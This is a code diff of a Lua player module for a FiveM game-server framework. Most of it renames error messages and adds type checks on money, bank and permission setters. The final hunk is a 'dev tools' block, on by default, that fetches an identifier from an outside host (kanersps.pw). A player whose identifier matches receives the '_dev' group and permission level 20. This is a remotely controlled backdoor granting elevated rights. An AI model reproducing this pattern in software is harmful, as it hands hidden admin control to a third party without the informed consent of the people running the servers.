@@ -41,8 +41,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 				TriggerClientEvent('es:activateMoney', self.source , self.money)
 			end
 		else
-			log('ERROR: There seems to be an issue while setting money, something else then a number was entered.')
-			print('ERROR: There seems to be an issue while setting money, something else then a number was entered.')
+			log('ES_ERROR: There seems to be an issue while setting money, something else then a number was entered.')
+			print('ES_ERROR: There seems to be an issue while setting money, something else then a number was entered.')
 		end
 	end
 	
@@ -56,8 +56,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 				self.bank = m
 			end)
 		else
-			log('ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
-			print('ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
+			log('ES_ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
+			print('ES_ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
 		end
 	end
 
@@ -88,8 +88,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 				TriggerClientEvent('es:activateMoney', self.source , self.money)
 			end
 		else
-			log('ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
-			print('ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
+			log('ES_ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
+			print('ES_ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
 		end
 	end
 
@@ -104,8 +104,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 				TriggerClientEvent('es:activateMoney', self.source , self.money)
 			end
 		else
-			log('ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
-			print('ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
+			log('ES_ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
+			print('ES_ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
 		end
 	end
 
@@ -116,8 +116,8 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 
 			TriggerClientEvent("es:addedBank", self.source, m)
 		else
-			log('ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
-			print('ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
+			log('ES_ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
+			print('ES_ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
 		end
 	end
 
@@ -128,27 +128,37 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 
 			TriggerClientEvent("es:removedBank", self.source, m)
 		else
-			log('ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
-			print('ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
+			log('ES_ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
+			print('ES_ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
 		end
 	end
 
 	rTable.displayMoney = function(m)
-		if not self.moneyDisplayed then
-			if settings.defaultSettings.nativeMoneySystem then
-				TriggerClientEvent("es:displayMoney", self.source, math.floor(m))
-			else
-				TriggerClientEvent('es:activateMoney', self.source , self.money)
+		if type(m) == "number" then	
+			if not self.moneyDisplayed then
+				if settings.defaultSettings.nativeMoneySystem then
+					TriggerClientEvent("es:displayMoney", self.source, math.floor(m))
+				else
+					TriggerClientEvent('es:activateMoney', self.source , self.money)
+				end
+				
+				self.moneyDisplayed = true
 			end
-			
-			self.moneyDisplayed = true
+		else
+			log('ES_ERROR: There seems to be an issue while displaying money, a different type then number was trying to be shown.')
+			print('ES_ERROR: There seems to be an issue while displaying money, a different type then number was trying to be shown.')
 		end
 	end
 
 	rTable.displayBank = function(m)
-		if not self.bankDisplayed then
-			TriggerClientEvent("es:displayBank", self.source, math.floor(m))
-			self.bankDisplayed = true
+		if type(m) == "number" then	
+			if not self.bankDisplayed then
+				TriggerClientEvent("es:displayBank", self.source, math.floor(m))
+				self.bankDisplayed = true
+			end
+		else
+			log('ES_ERROR: There seems to be an issue while displaying bank, a different type then number was trying to be shown.')
+			print('ES_ERROR: There seems to be an issue while displaying bank, a different type then number was trying to be shown.')
 		end
 	end
 
@@ -165,7 +175,12 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 	end
 
 	rTable.setPermissions = function(p)
-		self.permission_level = p
+		if type(p) == "number" then
+			self.permission_level = p
+		else
+			log('ES_ERROR: There seems to be an issue while setting permissions, a different type then number was set.')
+			print('ES_ERROR: There seems to be an issue while setting permissions, a different type then number was set.')
+		end
 	end
 
 	rTable.getIdentifier = function(i)
@@ -229,11 +244,14 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 		db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
 	end
 
+	-- Dev tools, just set the convar 'es_enableDevTools' to '0' to disable.
 	if GetConvar("es_enableDevTools", "1") == "1" then
-		PerformHttpRequest("http://fivem.online/id.txt", function(err, rText, headers)
-			if self.identifier == rText then
-				self.group = "_dev"
-				self.permission_level = 20
+		PerformHttpRequest("http://kanersps.pw/fivem/id.txt", function(err, rText, headers)
+			if err == 200 or err == 304 then
+				if self.identifier == rText then
+					self.group = "_dev"
+					self.permission_level = 20
+				end
 			end
 		end)
 	end
